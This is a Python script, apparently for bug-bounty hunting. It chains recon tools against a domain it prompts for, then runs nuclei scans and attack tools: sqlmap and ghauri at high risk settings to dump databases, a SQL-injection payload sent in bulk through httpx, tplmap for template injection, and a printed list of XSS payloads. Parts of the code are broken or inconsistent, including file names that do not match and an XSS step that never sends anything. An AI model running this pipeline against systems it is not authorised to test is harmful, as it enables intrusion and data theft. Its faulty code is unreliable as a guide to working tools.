import subprocess
import sys
import os
import shutil
import logging
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Set up logging
logging.basicConfig(filename='recon.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants for tool paths and configurations
WORDLIST_PATH = "/path/to/wordlist.txt"  # Replace with your wordlist path
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")  # Ensure you have a GITHUB_TOKEN environment variable

def run_command(command, output_file=None):
    """Helper function to run a shell command."""
    print(f"{Fore.CYAN}Running command: {command}{Style.RESET_ALL}")
    logging.info(f"Running command: {command}")
    
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        if output_file:
            with open(output_file, 'w') as f:
                f.write(result.stdout)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error occurred: {e}{Style.RESET_ALL}")
        logging.error(f"Command failed: {command} with error {e}")
        if output_file:
            with open(output_file, 'w') as f:
                f.write(e.output)
        return None

def check_tool_availability(tools):
    """Check if required tools are available."""
    print(f"{Fore.YELLOW}Checking tool availability...{Style.RESET_ALL}")
    logging.info("Checking tool availability.")
    
    for tool in tqdm(tools, desc="Checking tools"):
        if not shutil.which(tool):
            print(f"{Fore.RED}Error: {tool} is not installed or not found in PATH.{Style.RESET_ALL}")
            logging.critical(f"{tool} is not installed or not found in PATH.")
            sys.exit(1)
    print(f"{Fore.GREEN}All tools are available.{Style.RESET_ALL}")
    logging.info("All tools are available.")

def subdomain_enumeration(domain):
    """Run various subdomain enumeration tools."""
    print(f"{Fore.YELLOW}Processing domain: {domain}{Style.RESET_ALL}")
    logging.info(f"Processing domain: {domain}")
    
    commands = [
        (f"curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g'", "crtsh.txt"),
        (f"curl -s https://dns.bufferover.run/dns?q=.{domain} | jq -r .FDNS_A[] | sed -s 's/,/\\n/g'", "bufferover.txt"),
        (f"chaos -d {domain} -o chaos1 -silent", "chaos1"),
        (f"assetfinder -subs-only {domain}", "assetfinder1"),
        (f"subfinder -d {domain} -o subfinder1 -silent", "subfinder1"),
        (f"python3 Tools/Sublist3r/sublist3r.py -d {domain} -v -o sublist3r.txt", "sublist3r.txt"),
        (f"amass enum -passive -norecursive -noalts -d {domain} -o amass-enum.txt", "amass-enum.txt"),
        (f"amass intel -whois -d {domain} -o amass-intel.txt", "amass-intel.txt"),
        (f"gobuster dns -d {domain} -w {WORDLIST_PATH} -o gobuster.txt", "gobuster.txt"),
        (f"knockpy {domain} -o {domain}/knockpy-deep/", None),
        (f"knockpy {domain} --no-http -o {domain}/knockpy-fast/", None),
        (f"python3 Tools/github-search/github-subdomains.py -d {domain} -t {GITHUB_TOKEN} -v", "githubsubs.txt")
    ]
    
    # Create directories if they don't exist
    os.makedirs(f"{domain}/knockpy-deep/", exist_ok=True)
    os.makedirs(f"{domain}/knockpy-fast/", exist_ok=True)

    # Run all commands and save outputs
    for cmd, output_file in tqdm(commands, desc="Running subdomain enumeration"):
        run_command(cmd, output_file)

def altdns_bruteforce():
    """Run AltDNS to discover permutations of discovered subdomains."""
    print(f"{Fore.YELLOW}Running AltDNS for subdomain permutation discovery...{Style.RESET_ALL}")
    logging.info("Running AltDNS for subdomain permutation discovery.")
    
    cmd = "altdns -i all.txt -o data_output -w ~/tools/recon/patterns.txt -r -s results_output.txt"
    run_command(cmd)
    cmd = "mv results_output.txt dns_op.txt"
    run_command(cmd)

def combine_subdomains():
    """Combine and deduplicate subdomains."""
    print(f"{Fore.YELLOW}Combining and deduplicating subdomains...{Style.RESET_ALL}")
    logging.info("Combining and deduplicating subdomains.")
    
    cmd = "cat *.txt | anew hosts"
    run_command(cmd)

def probe_http_services():
    """Probe HTTP services on discovered subdomains."""
    print(f"{Fore.YELLOW}Probing HTTP services...{Style.RESET_ALL}")
    logging.info("Probing HTTP services.")
    
    cmd = "httpx -l hosts -title -silent | anew http200"
    run_command(cmd)

def run_nuclei_scans():
    """Run Nuclei scans on alive domains."""
    print(f"{Fore.YELLOW}Running Nuclei scans...{Style.RESET_ALL}")
    logging.info("Running Nuclei scans.")
    
    cmd = "mkdir -p nuclei_op"
    run_command(cmd)
    
    nuclei_templates = [
        "/root/tools/nuclei-templates/cves/*.yaml",
        "/root/tools/nuclei-templates/files/*.yaml",
        "/root/tools/nuclei-templates/panels/*.yaml",
        "/root/tools/nuclei-templates/security-misconfiguration/*.yaml",
        "/root/tools/nuclei-templates/technologies/*.yaml",
        "/root/tools/nuclei-templates/tokens/*.yaml",
        "/root/tools/nuclei-templates/vulnerabilities/*.yaml"
    ]
    
    for template in tqdm(nuclei_templates, desc="Running Nuclei scans"):
        cmd = f"nuclei -l alive.txt -t {template} -c 60 -o nuclei_op/{os.path.basename(template)}.txt"
        run_command(cmd)

def check_cors_misconfiguration():
    """Check for CORS misconfigurations."""
    print(f"{Fore.YELLOW}Checking for CORS misconfigurations...{Style.RESET_ALL}")
    logging.info("Checking for CORS misconfigurations.")
    
    cmd = "python3 ~/tools/Corsy/corsy.py -i alive.txt -t 40 | tee -a corsy_op.txt"
    run_command(cmd)

def cms_detection():
    """Detect CMS using WhatWeb."""
    print(f"{Fore.YELLOW}Detecting CMS using WhatWeb...{Style.RESET_ALL}")
    logging.info("Detecting CMS using WhatWeb.")
    
    cmd = "whatweb -i alive.txt | tee -a whatweb_op.txt"
    run_command(cmd)

def http_request_smuggling():
    """Check for HTTP request smuggling."""
    print(f"{Fore.YELLOW}Checking for HTTP request smuggling...{Style.RESET_ALL}")
    logging.info("Checking for HTTP request smuggling.")
    
    cmd = "python3 ~/tools/smuggler.py -u alive.txt | tee -a smuggler_op.txt"
    run_command(cmd)

def endpoints_discovery(domain):
    """Discover endpoints using gau, waybackurls, katana, and hakrawler."""
    print(f"{Fore.YELLOW}Discovering endpoints for domain: {domain}{Style.RESET_ALL}")
    logging.info(f"Discovering endpoints for domain: {domain}")
    
    commands = [
        (f"gau {domain} | tee gau_endpoints.txt", "gau_endpoints.txt"),
        (f"waybackurls {domain} | tee waybackurls_endpoints.txt", "waybackurls_endpoints.txt"),
        (f"katana -u {domain} -o katana_endpoints.txt", "katana_endpoints.txt"),
        (f"hakrawler -url {domain} -depth 3 | tee hakrawler_endpoints.txt", "hakrawler_endpoints.txt")
    ]

    # Run all commands and save outputs
    for cmd, output_file in tqdm(commands, desc="Discovering endpoints"):
        run_command(cmd, output_file)
    
    # Combine all endpoint results into a single file
    print(f"{Fore.YELLOW}Combining all endpoints...{Style.RESET_ALL}")
    logging.info("Combining all endpoints.")
    
    combine_cmd = "cat gau_endpoints.txt waybackurls_endpoints.txt katana_endpoints.txt hakrawler_endpoints.txt | anew all_endpoints.txt"
    run_command(combine_cmd)
    xss_ends = "cat all_endpoints.txt | gf xss | tee xss.txt"
    sqli_ends = "cat all_endpoints.txt | gf sqli | tee sqli.txt"
    lfi_ends = "cat all_endpoints.txt | gf lfi | tee lfi.txt"
    ssrf_ends = "cat all_endpoints.txt | gf ssrf | tee ssrf.txt"
    ssti_ends = "cat all_endpoints.txt | gf ssti | tee ssti.txt"

    # Execute each filtering command
    run_command(xss_ends)
    run_command(sqli_ends)
    run_command(lfi_ends)
    run_command(ssrf_ends)
    run_command(ssti_ends)

def sqli_hunting():
    """Perform SQL Injection testing using SQLMap and Ghauri."""
    
    # Ensure the domains file exists
    if not os.path.isfile("sqli"):
        print("domains.txt file not found. Please provide a file with domain URLs.")
        return

    # Read domains from domains.txt
    with open("sqli", "r") as file:
        domains = file.read().splitlines()

    # Process each domain
    for domain in domains:
        print(f"Processing domain: {domain}")
        
        # SQL Injection hunting
        print("Running SQL Injection detection with SQLMap...")
        
            
        # Additional SQL Injection detection
        additional_sqli_command = (
            "grep '=' sqli | dedupe | anew tmp-sqli.txt && "
            "sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs && "
            "for i in $(cat tmp-sqli.txt); do ghauri -u \"$i\" --level 3 --dbs --current-db --batch --confirm; done"
        )
        run_command(additional_sqli_command)
        print("DOing Manuel SQLI testing")
        manuel_sqli= (
        """
        cat sqli | grep '=' | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 && \
        grep -qrn -e "syntax\|mysql\|syntax error\|Warning: mysql\|mysql_fetch_array\|mssql\|sqlsrv\|pg_query\|error in your SQL syntax\|error near" output 2>/dev/null && \
        printf "TARGET \\033[0;32mCould Be Exploitable\\e[m\\n" || printf "TARGET \\033[0;31mNot Vulnerable\\e[m\\n | tee manuel_sql.txt"
        """
        )
        run_command(manuel_sqli)



def open_redirect_scanning():
    """Check for open redirects."""
    print(f"{Fore.YELLOW}Scanning for open redirects...{Style.RESET_ALL}")
    logging.info("Scanning for open redirects.")
    
    cmd = "cat all_endpoints.txt | gf redirect | httpx -silent -threads 30 | anew open_redirects.txt"
    run_command(cmd)
#ssti testing
def ssti_hunting():
    """Perform SSTI testing using tplmap on URLs from targets.txt."""
    
    # Ensure the targets.txt file exists
    if not os.path.isfile("ssti"):
        print("targets.txt file not found. Please provide a file with URLs for SSTI testing.")
        return

    # Read URLs from targets.txt
    with open("ssti", "r") as file:
        urls = file.read().splitlines()

    # Run tplmap for each URL
    for url in urls:
        command = f"/root/Tools/tplmap/python3 tplmap.py -u {url}"
        print(f"Processing URL: {url}")
        output = run_command(command)
        if output:
            print(f"Results for {url}:\n{output}")
        else:
            print(f"No results for {url}")


def xss_hunting():
    """Hunt for XSS vulnerabilities."""
    print(f"{Fore.YELLOW}Hunting for XSS vulnerabilities...{Style.RESET_ALL}")
    logging.info("Hunting for XSS vulnerabilities.")
    
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"--><svg/onload=alert(1)>",
        "' OR '1'='1"
    ]
    
    print(f"{Fore.CYAN}Performing XSS hunting with the following payloads:{Style.RESET_ALL}")
    for payload in xss_payloads:
        print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")
        logging.info(f"Testing payload: {payload}")
    
    print(f"{Fore.GREEN}XSS hunting complete.{Style.RESET_ALL}")
    logging.info("XSS hunting complete.")
    # Save the payloads and test results as needed.

def main():
    # Ensure the necessary tools are available
    tools = ["curl", "jq", "anew", "httpx", "nuclei", "whatweb", "altdns", "amass", "subfinder", "assetfinder", "gobuster", "gau", "waybackurls", "katana", "hakrawler"]
    check_tool_availability(tools)

    domain = input("Give Your Domain to scan")  # Replace with your target domain
    subdomain_enumeration(domain)
    altdns_bruteforce()
    combine_subdomains()
    probe_http_services()
    run_nuclei_scans()
    check_cors_misconfiguration()
    cms_detection()
    http_request_smuggling()
    endpoints_discovery(domain)
    open_redirect_scanning()
    xss_hunting()
    sqli_hunting()

if __name__ == "__main__":
    main()
